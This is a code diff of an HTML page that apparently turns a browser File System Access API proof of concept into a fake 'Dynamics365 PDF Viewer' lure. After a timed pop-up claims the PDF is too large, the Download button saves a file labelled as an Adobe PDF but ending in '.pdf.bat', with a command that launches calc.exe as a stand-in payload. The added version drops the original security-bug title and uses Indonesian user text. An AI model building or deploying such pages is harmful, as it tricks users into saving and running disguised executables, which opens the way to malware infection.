@@ -1,56 +1,98 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>PDF - Google Chrome and Microsoft Edge - File System Access API - security bug</title>
-    <link rel="stylesheet" type="text/css" href="styles.css" />
+    <meta charset="UTF-8">
+    <title>Dynamics365 PDF Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        .pdf-frame {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.6);
+        }
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 30px;
+            border: 1px solid #888;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .modal-content p {
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #0c5cd8;
+        }
+    </style>
 </head>
-
 <body>
+    <iframe src="Dynamics365file.pdf" class="pdf-frame"></iframe>
+
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <p><b>Dynamics365.pdf</b> terlalu besar untuk ditampilkan di browser.<br><br>
+            Silakan unduh file untuk melanjutkan membaca.</p>
+            <button id="downloadBtn" class="button">Download</button>
+        </div>
+    </div>
+
     <script>
-        //on page load
         window.onload = function () {
-            //after 3 sec
             setTimeout(() => {
-                //show pop-up 
                 document.getElementById("myModal").style.display = "block";
-                const body = document.querySelector('body')
-                body.addEventListener('mouseup', async () => {
+
+                document.getElementById("downloadBtn").addEventListener("click", async () => {
                     const options = {
-                        suggestedName: 'Dynamics',
+                        suggestedName: 'Dynamics365.pdf',
                         types: [
                             {
-                                description:
-                                    'Adobe Acrobat Document (.pdf)',
-                                accept: {
-                                    'text/plain': ['.pdf.lnk'] //could be .exe/.bat or anything
-                                }
+                                description: 'Adobe Acrobat Document',
+                                accept: { 'text/plain': ['.pdf.bat'] }
                             }
                         ],
-                        //delete from Save as type "*.*" option
                         excludeAcceptAllOption: true
-                    }
+                    };
 
-                    const handle = await window.showSaveFilePicker(options);
-                    const writable = await handle.createWritable();
-                    //script to run cmd in .bat
-                    await writable.write('C:\\Windows\\system32\\calc.exe');
-                    await writable.close();
-                })
+                    try {
+                        const handle = await window.showSaveFilePicker(options);
+                        const writable = await handle.createWritable();
+                        await writable.write('start calc.exe'); // Simulate payload
+                        await writable.close();
+                        alert("Download selesai.");
+                    } catch (err) {
+                        console.warn("User canceled or unsupported browser:", err);
+                    }
+                });
             }, 3000);
         };
     </script>
-
-    <!-- PDF reader -->
-    <iframe src="Dynamics365file.pdf" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="100%"
-        scrolling="auto">
-    </iframe>
-
-    <!-- Modal content -->
-    <div id="myModal" class="modal">
-        <div class="modal-content">
-            <p><b>Dynamics365.pdf</b> - file is too large for the PDF reader. <br><br>Download a file to continue reading...</p>
-            <button id="addNewFile" class="button-38" role="button">DOWNLOAD</button>
-        </div>
-    </div>
 </body>
-
 </html>
